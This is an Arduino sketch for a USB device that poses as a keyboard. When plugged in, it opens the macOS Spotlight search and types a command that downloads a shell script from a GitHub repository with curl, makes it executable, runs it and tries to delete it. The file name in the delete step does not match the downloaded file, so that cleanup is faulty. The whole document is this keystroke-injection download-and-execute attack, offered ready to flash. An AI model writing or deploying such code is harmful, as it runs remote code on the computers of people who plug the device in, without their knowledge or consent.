#include <Keyboard.h>

void setup()
{
  Keyboard.begin();
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  delay(100);
  Keyboard.releaseAll();
  delay(2000);
  
  Keyboard.println("curl -L -o ~/setUp.sh 'https://github.com/4n4k1n/Goose/raw/main/setUp.sh' && chmod +x ~/setUp.sh && bash ~/setUp.sh && rm ~/setup.sh");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop()
{
  // Nothing
}

